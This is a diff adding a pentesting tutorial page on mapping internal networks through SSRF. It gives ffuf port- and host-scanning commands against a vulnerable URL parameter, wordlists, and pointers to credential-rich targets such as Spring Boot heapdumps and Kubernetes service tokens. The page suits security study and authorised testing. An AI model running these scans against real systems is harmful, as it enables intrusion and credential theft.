@@ -1,0 +1,252 @@
+---
+title: Internal discovery
+description: Mapping internal services through SSRF - port scanning by response differential, hostname enumeration, and discovering bound services.
+mitre: [T1190, T1018, T1046]
+d3fend: [D3-NI, D3-NTA]
+impact: [InternalAccess]
+sidebar:
+  order: 3
+  label: Internal discovery
+---
+import { Aside, Steps } from '@astrojs/starlight/components';
+
+## TL;DR
+
+The application becomes your scanner. Use the differential between "port open" and "port closed" responses (length, status, time, error message) to enumerate internal services - then enumerate hostnames against the discovered ports.
+
+```bash
+# Length-based port scan
+ffuf -w ports.txt:PORT -u "http://<TARGET>/?url=http://127.0.0.1:PORT" -fs <CLOSED_LENGTH>
+
+# Regex-based when response shape is more complex
+ffuf -w ports.txt:PORT -u "http://<TARGET>/?url=http://127.0.0.1:PORT" -fr 'Connection refused'
+
+# Time-based when length is constant
+ffuf -w ports.txt:PORT -u "http://<TARGET>/?url=http://127.0.0.1:PORT" -mt 5
+```
+
+Success indicator: a small set of ports returns responses that differ from the closed-port baseline.
+
+## Step 1 - Establish the closed-port baseline
+
+Pick a port nothing should be listening on (high random number works) and record what the response looks like.
+
+```bash
+curl -i "http://<TARGET>/?url=http://127.0.0.1:1"
+```
+
+Capture three things:
+
+1. **Response length** (`Content-Length` header or actual body length)
+2. **Distinctive content** - `Connection refused`, `Errno 111`, `[Errno 61]`, etc.
+3. **Response time** - how long the closed-port request takes
+
+This baseline tells ffuf how to filter. Without it you can't distinguish hits from noise.
+
+## Step 2 - Build the port wordlist
+
+Common services first, full sweep if needed:
+
+```bash
+# Quick (top services)
+cat > ports-quick.txt <<EOF
+21
+22
+23
+25
+53
+80
+110
+139
+143
+443
+445
+3306
+3389
+5432
+5900
+5984
+6379
+8000
+8009
+8080
+8443
+9000
+9090
+9200
+11211
+27017
+EOF
+
+# Full sweep (slower)
+seq 1 65535 > ports-full.txt
+```
+
+Start with the quick list. If it returns nothing, fall back to the full sweep.
+
+## Step 3 - Run ffuf with the right filter
+
+The filter approach depends on what differs between open and closed.
+
+<Steps>
+
+1. **Length-based** - closed and open ports return responses of different sizes:
+
+   ```bash
+   ffuf -w ports-quick.txt:PORT \
+        -u "http://<TARGET>/?url=http://127.0.0.1:PORT" \
+        -fs 30 \
+        -t 40
+   ```
+
+   `-fs 30` filters out responses with size 30 (the closed-port size from your baseline). `-t 40` runs 40 concurrent requests.
+
+2. **Regex-based** - closed responses have a recognizable error string:
+
+   ```bash
+   ffuf -w ports-quick.txt:PORT \
+        -u "http://<TARGET>/?url=http://127.0.0.1:PORT" \
+        -fr 'Connection refused|Errno 111|timed out'
+   ```
+
+   Regex filtering is more reliable than length when responses include the requested URL (so length varies with port number).
+
+3. **Word-count based** - when length and regex aren't reliable but word count is stable:
+
+   ```bash
+   ffuf -w ports-quick.txt:PORT \
+        -u "http://<TARGET>/?url=http://127.0.0.1:PORT" \
+        -fw 3
+   ```
+
+4. **Time-based** - used when the application returns a fixed response regardless of internal port state, but takes longer when it actually connects:
+
+   ```bash
+   # Filter responses faster than 2 seconds (closed = fast fail)
+   ffuf -w ports-quick.txt:PORT \
+        -u "http://<TARGET>/?url=http://127.0.0.1:PORT" \
+        -mt 2
+   ```
+
+   Less reliable due to network jitter; use as fallback.
+
+</Steps>
+
+<Aside type="tip">
+The `Errno 111` regex (Linux's "connection refused") is the most universal closed-port signature. It survives even when the application wraps the response in HTML - the error string usually appears verbatim.
+</Aside>
+
+## Step 4 - Hostname enumeration
+
+Once you have ports, find the actual services. Internal hostnames matter - many apps bind to a hostname, not `127.0.0.1`, and Vhost-aware servers route differently per Host header.
+
+### Common internal hostnames
+
+```bash
+cat > hosts.txt <<EOF
+localhost
+127.0.0.1
+127.1
+0.0.0.0
+internal
+internal.local
+api
+api.internal
+admin
+admin.internal
+auth
+backend
+db
+redis
+cache
+queue
+metadata
+host.docker.internal
+kubernetes.default.svc
+EOF
+```
+
+### Iterate hosts against discovered ports
+
+```bash
+# Confirmed open: 8080, 5000
+ffuf -w hosts.txt:HOST \
+     -u "http://<TARGET>/?url=http://HOST:8080" \
+     -fs <CLOSED_SIZE>
+```
+
+`internal.app.local`, `host.docker.internal`, and `kubernetes.default.svc` are the high-yield targets in modern engagements. The first because it's a common convention; the second because Docker Desktop creates it; the third because Kubernetes service discovery reaches the API server from any pod.
+
+### CIDR sweeps
+
+When you know the internal subnet:
+
+```bash
+# AWS VPCs typically 10.0.0.0/16 or 172.31.0.0/16
+# Generate IPs
+python3 -c "import ipaddress; [print(ip) for ip in ipaddress.ip_network('10.0.0.0/24')]" > internal-ips.txt
+
+ffuf -w internal-ips.txt:IP \
+     -u "http://<TARGET>/?url=http://IP:80" \
+     -fs <CLOSED_SIZE>
+```
+
+Avoid `/16` sweeps unless you're committed - that's 65k requests at 40 concurrent = 25+ minutes minimum. Start with the gateway (`/24`) of whatever IP the target itself appears to have.
+
+## Identifying services on open ports
+
+Once you've found "port 5000 is open," figure out what it is.
+
+```bash
+# Banner grab
+curl -i "http://<TARGET>/?url=http://127.0.0.1:5000/"
+
+# Common service paths
+?url=http://127.0.0.1:5000/                       # root
+?url=http://127.0.0.1:5000/health                  # k8s/Docker health checks
+?url=http://127.0.0.1:5000/metrics                 # Prometheus
+?url=http://127.0.0.1:5000/actuator                # Spring Boot
+?url=http://127.0.0.1:5000/_status                 # generic status
+?url=http://127.0.0.1:5000/api/                    # REST APIs
+?url=http://127.0.0.1:5000/admin                   # admin panels
+```
+
+### Service fingerprints
+
+| Response contains | Service |
+| --- | --- |
+| `Server: Werkzeug` | Python Flask |
+| `X-Powered-By: Express` | Node.js Express |
+| `Server: gunicorn` | Python (Flask/Django/FastAPI behind gunicorn) |
+| `Server: nginx` with `X-Powered-By: PHP` | LEMP stack |
+| JSON with `actuator/`, `mappings`, `env` | Spring Boot Actuator (high value - see below) |
+| `+OK Redis` (gopher needed) | Redis 6379 |
+| `# Memcached` (telnet-style) | Memcached 11211 |
+| `mongo`, `_id` in JSON | MongoDB API or admin panel |
+| `Elasticsearch`, `_cluster`, `_cat/indices` | Elasticsearch 9200 |
+| `Couchbase`, `query?statement` | Couchbase 8093 |
+
+### High-value internal services
+
+These are worth special attention because they frequently lead to RCE or credential dumps:
+
+- **Spring Boot Actuator** at `/actuator` or `/admin/actuator` - `/env` reveals env vars including DB creds, `/heapdump` is a memory dump (extract creds with `jhat` or `MAT`)
+- **Redis** at 6379 - unauthenticated by default, RCE via cron/SSH-key/master-slave replication
+- **Elasticsearch** at 9200 - frequently unauthenticated internally, full data dump via `/_search?size=10000`
+- **Kubernetes API** at the cluster-internal IP, port 443 or 6443 - service token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token` if running in a pod
+- **AWS metadata** at `169.254.169.254` - see [Cloud metadata](/codex/web/server-side/ssrf/cloud-metadata/)
+- **Docker socket** at `/var/run/docker.sock` (file path, not network) - `unix:` schema, RCE via container creation
+
+## Common failure modes
+
+- **All ports return identical responses.** Application normalizes or wraps every response. Use [time-based detection](/codex/web/server-side/ssrf/blind/) instead, or look for tiny differences (one byte of padding, one different header).
+- **`127.0.0.1` blocked but discovered ports show in `localhost` requests.** Filter blocks the literal IP. Use hostname `localhost`, or [filter bypass](/codex/web/server-side/ssrf/filter-bypass/) techniques.
+- **Discovered port returns `200 OK` empty body.** Service is alive but responds with nothing for `GET /`. Try `POST /`, common paths (`/api`, `/health`, `/admin`), or service-specific paths from the fingerprints table above.
+- **ffuf returns far too many hits.** Filter is too loose. Add additional filters (`-fs N -fr regex`), narrow the wordlist, or check whether the application returns a redirect that has size matching your filter accidentally.
+- **Scan triggers WAF rate limiting.** SSRF probes are 1 outbound per request - at 40/sec that's a lot of internal connections from one source. Throttle (`-rate 10`) or scan in batches. Some WAFs detect the *internal* connection pattern, not the inbound rate.
+
+## Notes
+
+Internal discovery via SSRF is essentially nmap by proxy. The differences from real nmap: you can't see ICMP, you don't get OS fingerprinting, and every probe is an HTTP round-trip slow. The advantage: you're inside the firewall. A 30-minute SSRF port scan beats a 30-day-blocked external nmap.
+
+The killer combo is SSRF → Spring Boot Actuator → `/heapdump` → credentials. If you find an internal Java service responding on an unusual port, always probe `/actuator/heapdump` first; modern Spring Boot leaves it open by default in dev profiles, and the heap dump frequently contains active session tokens, DB connection strings, and other plaintext secrets.
